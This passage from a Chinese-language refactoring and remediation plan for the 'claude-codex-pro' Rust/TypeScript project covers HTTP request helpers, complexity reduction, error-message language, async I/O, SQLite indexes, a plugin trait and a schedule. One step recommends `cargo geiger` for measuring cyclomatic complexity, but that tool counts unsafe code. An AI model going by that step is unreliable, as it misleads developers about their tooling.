
#### 现状
根据 memory，已拆分为 12 个模块：
- `App.tsx` 从 5320 行降至 1612 行
- 拆分出：actions、state、effects、hooks 等

#### 后续改进

**1. 继续拆分剩余的 1612 行：**

```typescript
// apps/claude-codex-pro-manager/src/App.tsx
// 目标：< 500 行（仅包含顶层组合）

// ✅ 拆分路由逻辑
import { AppRouter } from './routing/AppRouter';

// ✅ 拆分状态管理
import { AppStateProvider } from './state/AppStateProvider';

// ✅ 拆分副作用
import { useAppEffects } from './effects/useAppEffects';

export function App() {
  return (
    <AppStateProvider>
      <AppEffectsRunner />
      <AppRouter />
    </AppStateProvider>
  );
}
```

**2. 引入状态管理库（可选）：**

```bash
npm install zustand
```

```typescript
// apps/claude-codex-pro-manager/src/state/settingsStore.ts
import create from 'zustand';

interface SettingsStore {
  settings: BackendSettings | null;
  loading: boolean;
  loadSettings: () => Promise<void>;
  updateSetting: (key: string, value: any) => Promise<void>;
}

export const useSettingsStore = create<SettingsStore>((set, get) => ({
  settings: null,
  loading: false,
  
  loadSettings: async () => {
    set({ loading: true });
    const result = await invoke('load_settings');
    set({ settings: result.payload, loading: false });
  },
  
  updateSetting: async (key, value) => {
    const { settings } = get();
    if (!settings) return;
    
    const updated = { ...settings, [key]: value };
    await invoke('save_settings', { settings: updated });
    set({ settings: updated });
  },
}));
```

---

### 修复 #11：代码重复 - HTTP 请求模式

#### 📍 位置
- **文件：** `crates/claude-codex-pro-core/src/protocol_proxy.rs`

#### ✅ 修复方案

**创建通用请求构建器：**

```rust
// crates/claude-codex-pro-core/src/http/request_builder.rs

pub struct ProxyRequestBuilder {
    client: reqwest::Client,
    base_url: String,
    api_key: String,
}

impl ProxyRequestBuilder {
    pub fn new(base_url: String, api_key: String, user_agent: &str) -> anyhow::Result<Self> {
        let client = crate::http_client::proxied_client(user_agent)?;
        Ok(Self { client, base_url, api_key })
    }

    pub async fn post<T: serde::Serialize>(
        &self,
        path: &str,
        body: &T,
    ) -> anyhow::Result<reqwest::Response> {
        let url = format!("{}{}", self.base_url, path);
        
        self.client
            .post(&url)
            .bearer_auth(&self.api_key)
            .json(body)
            .send()
            .await
            .context("HTTP 请求失败")
    }

    pub async fn get(&self, path: &str) -> anyhow::Result<reqwest::Response> {
        let url = format!("{}{}", self.base_url, path);
        
        self.client
            .get(&url)
            .bearer_auth(&self.api_key)
            .send()
            .await
            .context("HTTP 请求失败")
    }
}

// 使用
let builder = ProxyRequestBuilder::new(base_url, api_key, user_agent)?;
let response = builder.post("/v1/messages", &request_body).await?;
```

**创建响应处理 trait：**

```rust
pub trait ResponseHandler {
    type Output;
    
    fn handle_response(
        &self,
        status: StatusCode,
        body: &[u8],
    ) -> anyhow::Result<Self::Output>;
}

pub struct JsonResponseHandler;

impl ResponseHandler for JsonResponseHandler {
    type Output = serde_json::Value;
    
    fn handle_response(&self, status: StatusCode, body: &[u8]) -> anyhow::Result<Self::Output> {
        if !status.is_success() {
            anyhow::bail!("HTTP {}: {:?}", status, String::from_utf8_lossy(body));
        }
        
        serde_json::from_slice(body).context("JSON 解析失败")
    }
}
```

---

### 修复 #12：圈复杂度过高

#### 📍 位置
- **文件：** `crates/claude-codex-pro-core/src/multica.rs`

#### ✅ 修复策略

**1. 测量当前复杂度：**

```bash
cargo install cargo-geiger
cargo geiger --features=unsafe-statistics
```

**2. 应用提取方法（Extract Method）重构：**

```rust
// ❌ 修改前：100+ 行的复杂函数
fn process_complex_logic(input: &Input) -> Result<Output> {
    if condition1 {
        // 20 行逻辑
        if nested_condition {
            // 15 行逻辑
            if deeply_nested {
                // 10 行逻辑
            }
        }
    } else if condition2 {
        // 25 行逻辑
    }
    // ... 更多分支
}

// ✅ 修改后：拆分为语义明确的子函数
fn process_complex_logic(input: &Input) -> Result<Output> {
    if condition1 {
        return process_branch_a(input);
    } else if condition2 {
        return process_branch_b(input);
    }
    
    process_default_branch(input)
}

fn process_branch_a(input: &Input) -> Result<Output> {
    // 原 20 行逻辑
    let intermediate = prepare_data(input)?;
    
    if nested_condition {
        handle_nested_case(&intermediate)
    } else {
        handle_normal_case(&intermediate)
    }
}

fn handle_nested_case(data: &IntermediateData) -> Result<Output> {
    // 原 15 行逻辑
    // ...
}
```

**3. 使用 Clippy 强制限制：**

```rust
#![warn(clippy::cognitive_complexity)]
```

---

### 修复 #13：错误消息语言不一致

#### ✅ 修复方案

**1. 统一为中文（面向用户）：**

```rust
// 修改前（混杂）
anyhow::bail!("Failed to load config");  // 英文
anyhow::bail!("配置加载失败");           // 中文

// ✅ 修改后（统一中文）
anyhow::bail!("配置加载失败");
```

**2. 技术日志使用英文（面向开发者）：**

```rust
log::error!("Failed to acquire lock: {:?}", e);  // 日志用英文
anyhow::bail!("无法获取文件锁，请稍后重试");     // 用户消息用中文
```

**3. 引入 i18n（长期）：**

```toml
[dependencies]
rust-i18n = "3"
```

```rust
rust_i18n::i18n!("locales");

// 使用
t!("errors.config_load_failed")
```

---

## ⚡ 批次 4：性能优化（Low 优先级）

### 修复 #14：同步 I/O 阻塞异步运行时

#### 📍 位置
- **文件：** `crates/claude-codex-pro-core/src/settings.rs` 多处

#### ✅ 修复方案

**方案 A：使用 tokio::fs（推荐）**

```rust
// ❌ 修改前
pub fn load(&self) -> anyhow::Result<BackendSettings> {
    let json = std::fs::read_to_string(&self.path)?;  // 阻塞调用
    serde_json::from_str(&json).context("解析设置失败")
}

// ✅ 修改后
pub async fn load(&self) -> anyhow::Result<BackendSettings> {
    let json = tokio::fs::read_to_string(&self.path).await
        .context("读取设置文件失败")?;
    serde_json::from_str(&json).context("解析设置失败")
}
```

**方案 B：spawn_blocking 包装**

```rust
pub async fn load(&self) -> anyhow::Result<BackendSettings> {
    let path = self.path.clone();
    
    tokio::task::spawn_blocking(move || {
        let json = std::fs::read_to_string(&path)?;
        serde_json::from_str(&json).context("解析设置失败")
    })
    .await
    .context("异步任务失败")?
}
```

---

### 修复 #15：前端过度渲染（已部分完成）

根据 memory 已应用 memo 化。后续优化：

**1. 使用 React DevTools Profiler 定位：**

```bash
npm install --save-dev @welldone-software/why-did-you-render
```

**2. 细粒度状态订阅：**

```typescript
// ❌ 修改前：订阅整个 settings 对象
const settings = useSettings();

// ✅ 修改后：只订阅需要的字段
const relayProfiles = useSettings(state => state.relayProfiles);
```

---

### 修复 #16：SQLite 查询未使用索引

#### 📍 位置
- **文件：** `crates/claude-codex-pro-data/src/`

#### ✅ 修复方案

**添加索引迁移：**

```rust
// crates/claude-codex-pro-data/src/migrations.rs

pub fn create_indexes(conn: &rusqlite::Connection) -> anyhow::Result<()> {
    conn.execute_batch(r#"
        -- 会话 ID 索引
        CREATE INDEX IF NOT EXISTS idx_sessions_session_id 
        ON sessions(session_id);
        
        -- 时间戳索引（范围查询）
        CREATE INDEX IF NOT EXISTS idx_sessions_timestamp 
        ON sessions(created_at DESC);
        
        -- 复合索引（常见联合查询）
        CREATE INDEX IF NOT EXISTS idx_sessions_user_time 
        ON sessions(user_id, created_at DESC);
    "#)?;
    
    Ok(())
}
```

**验证索引效果：**

```sql
EXPLAIN QUERY PLAN 
SELECT * FROM sessions WHERE session_id = ?;
```

---

## 🏗️ 批次 5：架构重构（Long-term）

### 修复 #17：protocol_proxy.rs 职责过重

#### ✅ 重构方案

**目标结构：**

```
crates/claude-codex-pro-core/src/
  ├── protocol/
  │   ├── mod.rs
  │   ├── adapter.rs      // 协议转换
  │   ├── proxy.rs        // 请求代理
  │   ├── model_mapper.rs // 模型路由
  │   └── health.rs       // 健康检查
  └── protocol_proxy.rs   // 向后兼容的 facade
```

**步骤 1：提取协议适配器**

```rust
// crates/claude-codex-pro-core/src/protocol/adapter.rs

pub struct ProtocolAdapter;

impl ProtocolAdapter {
    pub fn responses_to_chat_completions(
        request: serde_json::Value
    ) -> anyhow::Result<serde_json::Value> {
        // 从 protocol_proxy.rs 移动逻辑
        // ...
    }
    
    pub fn chat_completions_to_responses(
        response: serde_json::Value
    ) -> anyhow::Result<serde_json::Value> {
        // ...
    }
}
```

**步骤 2：保持向后兼容**

```rust
// protocol_proxy.rs（向后兼容 facade）

mod protocol;

pub use protocol::adapter::ProtocolAdapter;
pub use protocol::proxy::ProxyHandler;
// ... 重新导出所有公共 API
```

---

### 修复 #18：循环依赖风险

#### ✅ 修复方案

**引入 common crate：**

```toml
# Cargo.toml
[workspace]
members = [
    "crates/claude-codex-pro-common",  # 新增
    "crates/claude-codex-pro-core",
    "crates/claude-codex-pro-data",
]

# crates/claude-codex-pro-common/Cargo.toml
[package]
name = "claude-codex-pro-common"
version = "0.1.0"

[dependencies]
serde = { version = "1", features = ["derive"] }
```

**迁移共享类型：**

```rust
// crates/claude-codex-pro-common/src/types.rs

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionId(pub String);

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UserId(pub String);

// core 和 data 都依赖 common，不再互相依赖
```

---

### 修复 #19：缺乏统一的插件接口

#### ✅ 设计方案

**定义 ProviderPlugin trait：**

```rust
// crates/claude-codex-pro-core/src/provider/plugin.rs

#[async_trait::async_trait]
pub trait ProviderPlugin: Send + Sync {
    /// 插件唯一标识
    fn id(&self) -> &str;
    
    /// 插件显示名称
    fn name(&self) -> &str;
    
    /// 支持的协议
    fn protocols(&self) -> Vec<RelayProtocol>;
    
    /// 验证配置有效性
    async fn validate_config(&self, config: &ProviderConfig) -> anyhow::Result<()>;
    
    /// 执行代理请求
    async fn proxy_request(
        &self,
        request: ProxyRequest,
    ) -> anyhow::Result<ProxyResponse>;
    
    /// 获取模型列表
    async fn list_models(&self) -> anyhow::Result<Vec<ModelInfo>>;
}

// 实现示例
pub struct OpenAIProvider;

#[async_trait::async_trait]
impl ProviderPlugin for OpenAIProvider {
    fn id(&self) -> &str {
        "openai"
    }
    
    fn name(&self) -> &str {
        "OpenAI Official"
    }
    
    fn protocols(&self) -> Vec<RelayProtocol> {
        vec![RelayProtocol::ChatCompletions]
    }
    
    async fn validate_config(&self, config: &ProviderConfig) -> anyhow::Result<()> {
        // 验证 API key 格式
        if !config.api_key.starts_with("sk-") {
            anyhow::bail!("OpenAI API key 格式无效");
        }
        Ok(())
    }
    
    async fn proxy_request(&self, request: ProxyRequest) -> anyhow::Result<ProxyResponse> {
        // 实现请求代理逻辑
        // ...
    }
    
    async fn list_models(&self) -> anyhow::Result<Vec<ModelInfo>> {
        // 查询 OpenAI /v1/models
        // ...
    }
}
```

**插件注册表：**

```rust
pub struct ProviderRegistry {
    plugins: HashMap<String, Box<dyn ProviderPlugin>>,
}

impl ProviderRegistry {
    pub fn new() -> Self {
        let mut registry = Self {
            plugins: HashMap::new(),
        };
        
        // 注册内置插件
        registry.register(Box::new(OpenAIProvider));
        registry.register(Box::new(AnthropicProvider));
        registry.register(Box::new(CustomProvider));
        
        registry
    }
    
    pub fn register(&mut self, plugin: Box<dyn ProviderPlugin>) {
        self.plugins.insert(plugin.id().to_string(), plugin);
    }
    
    pub fn get(&self, id: &str) -> Option<&dyn ProviderPlugin> {
        self.plugins.get(id).map(|b| &**b)
    }
}
```

---

## 📊 完整修复时间表

| 批次 | 问题数 | 优先级 | 预计工时 | 目标完成 |
|------|--------|--------|----------|----------|
| 批次 1 | 4 个 | P0 Critical/High | 15h | 2 天 |
| 批次 2 | 5 个 | P1 Medium | 20h | 1 周 |
| 批次 3 | 4 个 | P2 Low | 16h | 2 周 |
| 批次 4 | 3 个 | P3 Optimization | 12h | 3 周 |
| 批次 5 | 3 个 | P4 Long-term | 40h | 1 月 |
| **总计** | **19 个** | | **103h** | **5 周** |

## ✅ 验收标准

### 批次 1（安全）
- [ ] 所有 Critical/High 漏洞修复
- [ ] 安全测试通过（渗透测试）
- [ ] Code Review 完成
- [ ] 热修复版本发布

### 批次 2（正确性）
- [ ] 所有 unwrap() 替换为错误处理
- [ ] 资源泄漏测试通过（长时间运行）
- [ ] 并发测试通过（压力测试）

### 批次 3（可维护性）
- [ ] App.tsx < 500 行
- [ ] 代码重复率 < 5%
- [ ] 平均函数行数 < 50

### 批次 4（性能）
- [ ] 异步 I/O 覆盖率 > 95%
- [ ] 前端首屏渲染 < 1s
- [ ] SQLite 查询响应 < 100ms

### 批次 5（架构）
- [ ] 模块职责单一
- [ ] 无循环依赖
- [ ] 插件系统文档完善

---

**联系人：** 安全团队 / 架构师  
**文档版本：** v2.0 (完整版)  
**最后更新：** 2026-09-08
